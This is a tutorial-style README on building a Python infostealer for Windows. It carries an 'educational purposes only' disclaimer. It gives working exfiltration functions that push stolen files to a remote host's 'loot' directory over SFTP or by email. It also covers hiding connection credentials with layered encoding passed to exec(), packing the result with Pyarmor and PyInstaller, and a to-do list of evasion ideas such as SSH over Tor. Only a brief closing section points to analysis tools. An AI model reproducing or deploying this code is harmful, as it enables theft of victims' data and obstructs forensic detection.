# Python Malware Analysis
A guide on the build process, obfuscation techniques, and analysis of simple python-based infostealer malware.<p>
<b>** Disclaimer ** This tutorial is intended for educational purposes only. It is purely to demonstrate the ease of creation and a few capabilities of infostealer malware at a rudimenary level. I do not condone the malicious use of this material.</b>


<br>

## Prerequisites
- Windows 10
- Python 3.1X
> pip install -U -R requirements.txt

<br>

## Exfiltration Methods

### SFTP exfiltration using [Paramiko](https://www.paramiko.org/installing.html)
The example script shown only uses SFTP via the paramiko library to exfiltrate stolen data (for now at least). Below is a snippet of its usage:

    def sftp_func(filepath):
        success = False
        while success == False:   # this will ensure continuous ssh calls  until the data is sent
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect({RHOST ip}, {RHOST listening port}, {RHOST ssh username}, {RHOST ssh password}, timeout=3)
                sftp = client.open_sftp()
        
                destination_path = f'/home/{a}/loot/{os.path.basename(filepath)}'
                sftp.put(filepath, destination_path)
                success = True
                
            except paramiko.ssh_exception.NoValidConnectionsError:
                pass
            except OSError:
                pass

<br>

### SMTP

(finish later)

    def smtp_func(filepath):

        inbox_name = 'emailname@domain.com'
        inbox_pword = 'password'

        msg = EmailMessage()
        msg['Subject'] = f"{os.path.basename(filepath)}"
        msg['From'] = inbox_name
        msg['To'] = inbox_name

        # attachment not text
        msg.set_content(attachment)

        try:
            with smtplib.SMTP("smtp.domain.com", 587) as s:
                s.starttls()
                s.login(inbox_name, inbox_pword)
                s.send_message(msg)
        except:
            pass

<br>

### Other Ideas 
#### [PyExfil](https://github.com/ytisf/PyExfil)
#### [Cloakify](https://github.com/TryCatchHCF/Cloakify)

<br>

## Code Obfuscation Techniques
### Encoding variables
In this example script, the arguments passed to the 'client.connect()' function (where client = paramiko.SSHClient()) are not human-readable, but instead obfuscated using layers of encoding. Below is an example of what this looks like:

    # before encoding
    b = "<remote ssh password>"
    a = "<remote ssh username>"
    c = "<server ip>"

    # after encoding
    yoyo = "\u0036\u0032\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0032\u0036\u0035\u0036\u0064\u0036\u0066\u0037\u0034\u0036\u0035\u0032\u0030\u0037\u0033\u0037\u0033\u0036\u0038\u0032\u0030\u0037\u0030\u0036\u0031\u0037\u0033\u0037\u0033\u0037\u0037\u0036\u0066\u0037\u0032\u0036\u0034\u0033\u0065\u0032\u0032\u0030\u0061\u0036\u0031\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0032\u0036\u0035\u0036\u0064\u0036\u0066\u0037\u0034\u0036\u0035\u0032\u0030\u0037\u0033\u0037\u0033\u0036\u0038\u0032\u0030\u0037\u0035\u0037\u0033\u0036\u0035\u0037\u0032\u0036\u0065\u0036\u0031\u0036\u0064\u0036\u0035\u0033\u0065\u0032\u0032\u0030\u0061\u0036\u0033\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0033\u0036\u0035\u0037\u0032\u0037\u0036\u0036\u0035\u0037\u0032\u0032\u0030\u0036\u0039\u0037\u0030\u0033\u0065\u0032\u0032"

    ...
    # usage in SFTP call
    exec(bytes.fromhex(yoyo), globals())   # converts the hexidecimal string to meaningful variables, python understands escape unicode chars (e.g. \u0036)
    client.connect(c, 22, a, b, timeout=4)
    ...

Pasting the original text into [Cyberchef](https://gchq.github.io/CyberChef/) and applying the following operations yields the legible string 'yoyo': 
- To Hex, No delimiter
- Escape Unicode Chars, Padding: 4, Encode all chars

However, it should be noted that this is a very crude technique as encoded characters are immediately recognizable to skilled forensic analysts and can be easily undone with several decoding tools. That said, when used in conjunction with other obfuscation techniques, encoding can slightly delay reverse engineering efforts.

<br>

### Using [Pyarmor](https://pypi.org/project/pyarmor/)
To apply basic code obfuscation:
> pyarmor gen example.py

<br>

## Using [Pyinstaller](https://pyinstaller.org/en/stable/usage.html)
### Initial building:
> cd dist
> pyinstaller example.py --onefile
> 

<br>

### Editing the .spec file
...


<br>

## Malware Analysis

**[PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor)** - A Python script to extract the contents of a PyInstaller generated Windows executable file. The contents of the pyz file (usually pyc files) present inside the executable are also extracted and automatically fixed so that a Python bytecode decompiler will recognize it.

**[uncompyle6](https://github.com/rocky/python-uncompyle6/)** - A cross-version Python bytecode decompiler. Translates Python bytecode back into equivalent Python source code.

<br>

## To-do List
- change ssh port to 443 or 53
- Metasploit download+exec module
- .py to .pdf
- smtp exfiltration
- ssh key integration
- encrypted ssh password from http server
- ssh over tor socket
